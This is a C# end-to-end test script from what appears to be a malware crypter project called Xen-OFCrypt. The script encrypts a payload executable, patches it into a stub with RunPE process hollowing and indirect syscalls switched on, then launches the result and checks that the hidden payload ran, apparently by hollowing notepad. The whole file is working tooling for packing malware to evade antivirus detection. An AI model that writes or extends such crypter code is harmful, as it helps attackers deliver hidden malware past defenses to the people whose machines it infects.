using System;
using System.IO;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Security.Cryptography;
using XanthoroxCrypted.Core;

Console.WriteLine("=== E2E Test: Build + Patch + Run ===\n");

string stubDir = @"D:\Development\projects\Malware\crypters\Xen-OFCrypt";
string outDir = Path.Combine(stubDir, "build", "out");
string stubPath = Path.Combine(outDir, "stub.exe");
string markerPath = @"C:\temp\runpe_marker.txt";
string payloadPath = Path.Combine(stubDir, "build", "e2e_test", "bin", "test_payload_simple.exe");
string outputPath = Path.Combine(outDir, "e2e_crypted_test.exe");

if (!File.Exists(stubPath)) { Console.WriteLine("[FAIL] stub.exe not found"); return; }
if (!File.Exists(payloadPath)) { Console.WriteLine("[FAIL] test_payload_simple.exe not found"); return; }
Console.WriteLine("[1] stub.exe + payload found");

Console.WriteLine("[2] Patching...");
byte[] stubData = File.ReadAllBytes(stubPath);
byte[] rawPayload = File.ReadAllBytes(payloadPath);
byte[] key = RandomNumberGenerator.GetBytes(32);

byte[] encryptedPayload = CryptoEngine.Encrypt(rawPayload, key, CipherType.XOR);

var config = new BuildConfig {
    RunPE = true,
    HostProcess = 0,
    EncAlgorithm = 3,
    IndirectSyscalls = true,
};

string error = StubPatcher.Build(stubData, outputPath, encryptedPayload, key, config);
if (!string.IsNullOrEmpty(error)) { Console.WriteLine($"[FAIL] {error}"); return; }
Console.WriteLine("[2] Patched OK");

if (File.Exists(markerPath)) File.Delete(markerPath);
foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
Thread.Sleep(300);

Console.WriteLine("[3] Launching...");
var proc = Process.Start(new ProcessStartInfo(outputPath) { UseShellExecute = false });

bool found = false;
for (int i = 0; i < 10; i++) {
    Thread.Sleep(2000);
    if (File.Exists(markerPath)) {
        string content = File.ReadAllText(markerPath);
        Console.WriteLine($"[PASS] Marker file found after {((i+1)*2)}s: {content.Trim()}");
        found = true;
        break;
    }
    // Check process status
    bool stubAlive = true;
    try { Process.GetProcessById(proc.Id); } catch { stubAlive = false; }
    var notepads = Process.GetProcessesByName("notepad");
    Console.WriteLine($"  t={((i+1)*2)}s: marker=false stubAlive={stubAlive} notepads={notepads.Length}");
}

if (!found) {
    Console.WriteLine("[FAIL] Marker file NOT found after 20s — payload did not execute");
    try { var s = Process.GetProcessById(proc.Id); Console.WriteLine($"  Stub still running PID={s.Id}"); s.Kill(); }
    catch { Console.WriteLine("  Stub exited"); }

    string debugLog = @"C:\temp\xen_debug.log";
    if (File.Exists(debugLog)) {
        Console.WriteLine("\n--- Debug log (last 20 lines) ---");
        var lines = File.ReadAllLines(debugLog);
        foreach (var line in lines.Skip(Math.Max(0, lines.Length - 20)))
            Console.WriteLine("  " + line);
    }
}

foreach (var p in Process.GetProcessesByName("notepad")) try { p.Kill(); } catch {}
if (File.Exists(markerPath)) File.Delete(markerPath);

Console.WriteLine($"\n=== E2E Test Complete === [{(found ? "PASS" : "FAIL")}]");
